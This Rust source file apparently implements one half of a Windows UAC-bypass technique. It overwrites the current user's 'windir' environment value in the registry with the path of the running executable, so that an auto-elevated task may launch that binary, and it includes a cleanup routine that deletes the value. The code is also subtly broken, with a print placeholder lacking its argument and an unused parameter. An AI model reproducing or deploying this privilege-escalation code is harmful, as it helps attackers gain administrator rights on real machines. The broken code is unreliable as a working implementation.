use std::{env::current_exe, ffi::CString, path::Path};
use windows::Win32::{
  Foundation::PSTR,
  System::Registry::{
    RegCloseKey, RegDeleteValueA, RegOpenKeyExA, RegSetValueExA, HKEY, KEY_WRITE, REG_SZ,
  },
};

pub use windows::Win32::System::Registry::{
  HKEY_CLASSES_ROOT, HKEY_CURRENT_CONFIG, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS,
};

pub fn set_value<T: AsRef<Path>>(root: HKEY, value_path: &T) {
  let value_path = value_path.as_ref();

  println!("[+] Setting the {} registry key...");

  let mut hkey = HKEY::default();
  let value_name = CString::new("windir").unwrap();
  let value_name = PSTR(value_name.as_ptr() as _);
  let subkey = CString::new("Environment").unwrap();
  let subkey = PSTR(subkey.as_ptr() as _);

  {
    let res = unsafe { RegOpenKeyExA(root, subkey, 0, KEY_WRITE, &mut hkey) };

    if res != 0 {
      panic!(
        "Error calling RegOpenKeyExA: {:#?}",
        std::io::Error::from_raw_os_error(res as i32)
      );
    };
  }

  let current_exe = format!("\"{}\"", current_exe().unwrap().to_string_lossy());

  {
    let res = unsafe {
      RegSetValueExA(
        hkey,
        value_name,
        0,
        REG_SZ,
        current_exe.as_ptr(),
        current_exe.len() as u32,
      )
    };

    if res != 0 {
      unsafe { RegCloseKey(hkey) };

      panic!(
        "Error calling RegSetValueExA: {:#?}",
        std::io::Error::from_raw_os_error(res as i32)
      );
    };

    unsafe { RegCloseKey(hkey) };
  }
}

pub fn delete_windir() {
  println!("[+] Deleting the windir registry key...");

  let mut hkey = HKEY::default();

  let subkey = CString::new("Environment").unwrap();

  {
    let res = unsafe {
      RegOpenKeyExA(
        HKEY_CURRENT_USER,
        PSTR(subkey.as_ptr() as _),
        0,
        KEY_WRITE,
        &mut hkey,
      )
    };

    if res != 0 {
      panic!(
        "Error calling RegOpenKeyExA: {:#?}",
        std::io::Error::from_raw_os_error(res as i32)
      );
    };
  }

  let value_name = CString::new("windir").unwrap();
  let value_name = PSTR(value_name.as_ptr() as *mut _);

  {
    let res = unsafe { RegDeleteValueA(hkey, value_name) };

    if res != 0 {
      unsafe { RegCloseKey(hkey) };

      panic!(
        "Error calling RegDeleteValueA: {:#?}",
        std::io::Error::from_raw_os_error(res as i32)
      );
    };
  }

  {
    let res = unsafe { RegCloseKey(hkey) };

    if res != 0 {
      panic!(
        "Error calling RegCloseKey: {:#?}",
        std::io::Error::from_raw_os_error(res as i32)
      );
    };
  }
}